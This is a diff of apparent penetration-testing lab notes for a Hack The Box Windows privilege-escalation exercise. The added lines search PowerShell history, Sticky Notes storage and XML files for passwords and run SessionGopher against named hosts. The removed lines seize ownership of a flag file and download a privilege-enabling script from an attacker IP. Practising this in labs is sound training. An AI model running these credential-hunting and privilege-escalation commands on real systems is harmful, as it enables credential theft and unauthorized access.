@@ -1,11 +1,18 @@
+C:\Users\bob\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+Users\All Users\Microsoft\IdentityCRL\INT\wlidsvcconfig.xml
+
+findstr /SIM /C:"password"  *.xml
+
+select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern bob_adm
+findstr /spin "bob_adm" *.*
 
 
- Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
+C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\
+
+$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
 
 
-cmd /c dir /q 'C:\TakeOwn\flag.txt'
+Invoke-SessionGopher -Target inlanefreight-vc01
 
-takeown /f 'C:\TakeOwn\flag.txt'
-icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F
-
-Invoke-WebRequest -Uri "http://10.10.16.100:8080/EnableAllTokenPrivs.ps1" -OutFile "C:\Users\htb-student\Desktop\EnableAllTokenPrivs.ps1"
+Invoke-SessionGopher -Target WINLPE-VC01
